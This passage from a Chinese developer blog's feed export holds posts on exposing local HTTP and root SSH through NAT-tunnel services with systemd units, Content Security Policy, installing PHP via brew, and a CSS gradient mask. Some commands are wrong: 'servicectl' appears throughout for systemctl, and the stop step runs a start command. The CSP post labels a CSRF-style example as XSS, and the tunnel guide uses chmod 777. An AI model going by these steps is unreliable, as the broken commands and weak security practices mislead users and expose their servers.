class="line">2</span><br></pre></td><td class="code"><pre><span class="line">servicectl start nginx</span><br><span class="line">servicectl enable nginx</span><br></pre></td></tr></table></figure><h2 id="2-2-蜻蜓映射"><a href="#2-2-蜻蜓映射" class="headerlink" title="2.2 蜻蜓映射"></a>2.2 蜻蜓映射</h2><p>推荐使用蜻蜓映射来映射 http 服务，因为其可以免费绑定一个你自己的域名，并且支持 https。</p><p>官方网站<a href="https://flynat.51miaole.com/">https://flynat.51miaole.com/</a></p><p>按照提示安装客户端：</p><p><img src="https://s2.loli.net/2021/12/09/r8D3AYwXaUCyG5k.png" alt=""></p><p>由于这个公司已经很久没有维护该项目，导致它的自动启动指令是无效的，因此我们要自己编写自动启动脚本。</p><p>首先要安装 <code>screen</code> 可以让我们后台启动一个命令行空间来跑应用（类似 nohup，但是 screen 可以让我们随时查看执行应用的屏幕信息，并且内网穿透的应用在开机时使用 nohup 可能无法正常启动）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install screen</span><br></pre></td></tr></table></figure><p>将下面的代码写入到 <code>/usr/lib/systemd/system/flynatc.service</code> 中，注意要将 <code>&lt;username&gt;</code> 和 <code>&lt;token&gt;</code> 分别替换为你自己蜻蜓映射总览页面的用户名与 Token：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># Centos 7</span><br><span class="line"># 存放位置 /usr/lib/systemd/system</span><br><span class="line"># 开启 servicectl start flynatc</span><br><span class="line"># 关闭 servicectl stop flynatc</span><br><span class="line"># 开机启动 servicectl enable flynatc</span><br><span class="line"># 取消开机启动 servicectl disable flynatc</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Flynat Service</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=screen -d -m /usr/local/flynat/flynatc -u &lt;username&gt; -k &lt;token&gt;</span><br><span class="line"># Suppress stderr to eliminate duplicated messages in syslog. NM calls openlog()</span><br><span class="line"># with LOG_PERROR when run in foreground. But systemd redirects stderr to</span><br><span class="line"># syslog by default, which results in logging each message twice.</span><br><span class="line">StandardOutput=syslog</span><br><span class="line">StandardError=null</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>启动映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servicectl start flynatc</span><br></pre></td></tr></table></figure><p>开启开机自启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servicectl enable flynatc</span><br></pre></td></tr></table></figure><h2 id="2-3-网云穿"><a href="#2-3-网云穿" class="headerlink" title="2.3 网云穿"></a>2.3 网云穿</h2><p>网云穿也是一个内网穿透服务，其提供了一个免费域名，并且免费域名是不会变的，因此特别适合作为 ssh 服务的穿透工具。</p><p>官网：<a href="https://xiaomy.net/">https://xiaomy.net/</a></p><p>注册完成之后可以申请一条免费隧道，按照如下设置来映射我们本机的 ssh 服务端口：</p><p><img src="https://s2.loli.net/2021/12/11/D5SMEnZLk9HO6ow.png" alt=""></p><p>然后在你的终端内下载网云穿的内网穿透服务，并将其放到一个你能找到的地方（这里我就放到 <code>~</code> 目录下了）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">wget https://down.xiaomy.net/linux/wyc_linux_arm</span><br><span class="line">chmod 777 ./wyc_linux_arm # 设置软件执行权限</span><br></pre></td></tr></table></figure><p>然后调用：<code>./wyc_linux_arm token=&lt;token&gt;</code>（token 就是你控制台中刚才创建的那条隧道的令牌）</p><p><img src="https://s2.loli.net/2021/12/11/CDeg2NuKRY3lFQi.png" alt=""></p><p>服务启动成功后就可以使用 ssh 指令来测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@&lt;域名&gt; -p &lt;外网端口&gt;</span><br></pre></td></tr></table></figure><p>如果正常连接就可以按照蜻蜓映射那样创建一个 service 脚本到，你可以直接复制下面写好的脚本（记得替换 token）并将其命名为 <code>wcy.service</code>，放到 <code>/usr/lib/systemd/system/</code> 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Wcy Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=screen -d -m ~/apps/wyc/wyc_linux_arm -token=&lt;token&gt;</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>启动映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servicectl start wcy</span><br></pre></td></tr></table></figure><p>开启开机自启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servicectl enable wcy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 Content Security Policy(CSP) 内容安全策略</title>
      <link href="/2021/09/ef911b2b102e.html"/>
      <url>/2021/09/ef911b2b102e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-何为-CSP"><a href="#1-何为-CSP" class="headerlink" title="1. 何为 CSP"></a>1. 何为 CSP</h1><p>CSP 是一种有效防止用户浏览器页面安全的一种策略，通过设置 CSP，浏览器能够阻止恶意的 XSS 攻击。</p><p>举个例子：</p><p>在某一博客类的网站上，用户可以插入任何富文本内容。于是黑客就向页面插入了一个恶意的图片链接，浏览器加载了图片，就发送了一个 GET 请求。但我们无法保证图片的链接是安全的，比如这个 GET 请求会诱骗你关注某个人的博客：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.blog.xyz/api?follow_id=123</span><br></pre></td></tr></table></figure><p>这种攻击方式就是一种常见的 XSS 攻击。</p><p>作为一个网站的管理者，假如我们可以有一种白名单机制，仅允许我们的页面上加载白名单域名的资源，其他的资源请求通通拒绝访问，那我们就可以有效避免类似的 XSS 攻击了。这种设置白名单的方式，就是内容限制安全策略，即为 Content Security Policy。</p><h1 id="2-如何设置-CSP"><a href="#2-如何设置-CSP" class="headerlink" title="2. 如何设置 CSP"></a>2. 如何设置 CSP</h1><p>那么讲完了何为 CSP，又该如何设置 CSP 呢？</p><p>一个安全且标准的浏览器支持两种设置方式：</p><ul><li>一种是读取 HTML 页面的 <code>&lt;meta&gt;</code> 标签中声明的安全策略，这个可以由前端在编写页面时来添加</li><li>另外一种就是请求 HTML 页面时，读取响应头中的 <code>Content-Security-Policy</code> 字段声明的安全策略，这个可以由后台在服务器端添加</li></ul><h2 id="2-1-在-meta-中声明-CSP"><a href="#2-1-在-meta-中声明-CSP" class="headerlink" title="2.1 在 meta 中声明 CSP"></a>2.1 在 meta 中声明 CSP</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置：</p><ul><li>脚本：只信任当前域名</li><li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li><li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul><h2 id="2-2-在响应头中声明-CSP"><a href="#2-2-在响应头中声明-CSP" class="headerlink" title="2.2 在响应头中声明 CSP"></a>2.2 在响应头中声明 CSP</h2><p>以 express 为例，可以使用 expressCspHeader 中间件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="title function_">expressCspHeader</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;default-src&#x27;</span>: [<span class="variable constant_">SELF</span>, <span class="variable constant_">INLINE</span>, <span class="string">&#x27;*.baidu.com&#x27;</span>, <span class="variable constant_">ALLOW_SAME_ORIGIN</span>],</span><br><span class="line">        <span class="string">&#x27;script-src&#x27;</span>: [<span class="variable constant_">SELF</span>, <span class="variable constant_">INLINE</span>, <span class="string">&#x27;*.baidu.com&#x27;</span>, <span class="variable constant_">ALLOW_SAME_ORIGIN</span>, <span class="variable constant_">EVAL</span>],</span><br><span class="line">        <span class="string">&#x27;style-src&#x27;</span>: [<span class="variable constant_">SELF</span>, <span class="variable constant_">INLINE</span>, <span class="string">&#x27;*.baidu.com&#x27;</span>, <span class="variable constant_">ALLOW_SAME_ORIGIN</span>],</span><br><span class="line">        <span class="string">&#x27;img-src&#x27;</span>: [<span class="string">&#x27;data:&#x27;</span>, <span class="variable constant_">INLINE</span>, <span class="string">&#x27;*.baidu.com&#x27;</span>, <span class="variable constant_">ALLOW_SAME_ORIGIN</span>],</span><br><span class="line">        <span class="string">&#x27;worker-src&#x27;</span>: [<span class="variable constant_">NONE</span>],</span><br><span class="line">        <span class="string">&#x27;block-all-mixed-content&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>请求资源时：</p><p><img src="https://i.loli.net/2021/09/07/PeVx6HwoEWYUkfZ.png" alt=""></p><p>当我们页面加载非 <code>baidu.com</code> 域名下的图片资源时，就会出现 <code>Provisional headers are shown</code> 的错误警告：</p><p><img src="https://i.loli.net/2021/09/07/3jmMSDXVObHzWyr.png" alt=""></p><h1 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">MDN - 内容安全策略( CSP )</a><br><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">阮一峰 - Content Security Policy 入门教程</a><br><a href="https://developer.chrome.com/docs/apps/contentSecurityPolicy/">Chrome Developers - Content Security Policy</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS 下安装php指南</title>
      <link href="/2021/09/e44f049da258.html"/>
      <url>/2021/09/e44f049da258.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>macOS 自带 PHP，以 Big Sur 为例，自带 PHP7.3：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php --version</span></span><br><span class="line">WARNING: PHP is not recommended</span><br><span class="line">PHP is included in macOS for compatibility with legacy software.</span><br><span class="line">Future versions of macOS will not include PHP.</span><br><span class="line">PHP 7.3.24-(to be removed in future macOS) (cli) (built: Jun 17 2021 21:41:15) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.3.24, Copyright (c) 1998-2018 Zend Technologies</span><br></pre></td></tr></table></figure><p>但是在项目中，我们可能用到各种版本的 PHP，同时更重要的是，macOS 自带的 PHP 是一个阉割版本，比如 <code>php-cgi</code> 就不包含在里面。</p><p>如果我们想安装完整的 php，可以使用 brew 来进行安装。</p><h1 id="2-使用-brew-安装-php"><a href="#2-使用-brew-安装-php" class="headerlink" title="2. 使用 brew 安装 php"></a>2. 使用 brew 安装 php</h1><h2 id="1-安装-brew"><a href="#1-安装-brew" class="headerlink" title="1. 安装 brew"></a>1. 安装 brew</h2><p>上 brew 官网，按照说明即可</p><h2 id="2-安装-php"><a href="#2-安装-php" class="headerlink" title="2. 安装 php"></a>2. 安装 php</h2><p>安装最新版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install php</span></span><br></pre></td></tr></table></figure><p>安装指定版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install php@7.4</span></span><br></pre></td></tr></table></figure><h2 id="3-启动安装好的-php"><a href="#3-启动安装好的-php" class="headerlink" title="3. 启动安装好的 php"></a>3. 启动安装好的 php</h2><p>安装完成后，会出现如下提示（以 7.4 举例）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">To enable PHP in Apache add the following to httpd.conf and restart Apache:</span><br><span class="line">    LoadModule php7_module /usr/local/opt/php@7.4/lib/httpd/modules/libphp7.so</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch \.php$&gt;</span><br><span class="line">        SetHandler application/x-httpd-php</span><br><span class="line">    &lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">Finally, check DirectoryIndex includes index.php</span><br><span class="line">    DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">The php.ini and php-fpm.ini file can be found in:</span><br><span class="line">    /usr/local/etc/php/7.4/</span><br><span class="line"></span><br><span class="line">php@7.4 is keg-only, which means it was not symlinked into /usr/local,</span><br><span class="line">because this is an alternate version of another formula.</span><br><span class="line"></span><br><span class="line">If you need to have php@7.4 first in your PATH, run:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/php@7.4/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/php@7.4/sbin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find php@7.4 you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/php@7.4/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/php@7.4/include&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">To start php@7.4:</span><br><span class="line">  brew services start php@7.4</span><br><span class="line">Or, if you don&#x27;t want/need a background service you can just run:</span><br><span class="line">  /usr/local/opt/php@7.4/sbin/php-fpm --nodaemonize</span><br></pre></td></tr></table></figure><p>按照提示，执行如下指令启动 php 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew services start php</span></span><br></pre></td></tr></table></figure><p>我们还可以调用如下指令查看当前的服务运行情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew services list</span></span><br><span class="line">Name    Status  User Plist</span><br><span class="line">php     stopped</span><br><span class="line">php@7.4 stopped</span><br></pre></td></tr></table></figure><p>如果要想停止服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew services start php@7.4</span></span><br></pre></td></tr></table></figure><h2 id="4-覆盖系统服务"><a href="#4-覆盖系统服务" class="headerlink" title="4. 覆盖系统服务"></a>4. 覆盖系统服务</h2><p>我们安装并启动好了 php 之后，再次执行 <code>php --version</code> 会发现还是原来系统版本的 php，同时 php-cgi 服务同样也是没有的，我们需要将安装好的 php 替换掉系统自带的 php。</p><p>brew 提供了 <code>brew link</code> 指令来快捷帮我们进行服务替换：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew <span class="built_in">link</span> --overwrite --force php@7.4</span></span><br><span class="line">Linking /usr/local/Cellar/php@7.4/7.4.23... 25 symlinks created.</span><br><span class="line"></span><br><span class="line">If you need to have this software first in your PATH instead consider running:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/php@7.4/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/php@7.4/sbin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure><p>之后再执行 <code>php --version</code> 就可以得到我们的目标版本了。</p><p>如果想要解除link，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew <span class="built_in">unlink</span> php@7.4</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[CSS Trick] CSS渐变遮罩的实现</title>
      <link href="/2021/08/bcf480ce6928.html"/>
      <url>/2021/08/bcf480ce6928.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>在设计稿中，经常遇到渐变场景，说到渐变那必须要谈及 <code>linear-gradient</code>，这里推荐去看《CSS 揭秘》一书中对渐变的介绍。</p><p>大部分我们都是在 <code>background</code> 中去使用 <code>linear-gradient</code>，来实现一个渐变背景。但是在一些场景下，我们希望内容部分有个整体的渐变，比如这张设计图：</p><p><img src="https://i.loli.net/2021/08/06/BbVJivP7pYyksK6.png" alt=""></p><p>进度条的实现比较简单，但是进度条的下方有一个整体的渐变效果，这该如何实现呢？</p><p>如果我们想法设法的去把进度条做成渐变效果，那么方向就错了。如果你熟悉 PhotoShop，那么就会想到利用 <code>遮罩</code> 这个概念来实现这个效果，CSS 里正好也提供了一个 <code>mask-image</code> 的遮罩属性。</p><h1 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h1><p>我们可以使用 <code>mask-image</code> 与 <code>linear-gradient</code> 结合，创建一个遮罩层，我们将这个遮罩层放在一个普通的 div 上先试试看：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  -webkit-<span class="attribute">mask-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">#000000</span>, transparent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/06/frazPU5HQNnvJEt.png" alt=""></p><p>我们可以看出 div 从上倒下都有一个渐变的效果，如果我们只想让底部边缘渐变，可以设置一下渐变的起始位置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="comment">/* 只从底部 100px 的位置开始渐变 */</span></span><br><span class="line">  -webkit-<span class="attribute">mask-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">#000000</span> <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">100px</span>), transparent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/06/juRf7dDCQpL6Z3z.png" alt=""></p><p>应用到环形进度条上：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">      -webkit-<span class="attribute">mask-image</span>: <span class="built_in">linear-gradient</span>(<span class="number">#121212</span> <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">100px</span>), transparent);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.bg</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="number">#4092FE</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-bottom-color</span>: transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-left-color</span>: transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">45deg</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.fill</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: <span class="number">10px</span> solid <span class="number">#B4DDFE</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-bottom-color</span>: transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-left-color</span>: transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">90deg</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;fill&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/06/aF2hqwDV5mRWrbL.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>令人头大的ES Module 与 CommonJS</title>
      <link href="/2021/07/2553002dd4f2.html"/>
      <url>/2021/07/2553002dd4f2.html</url>
      
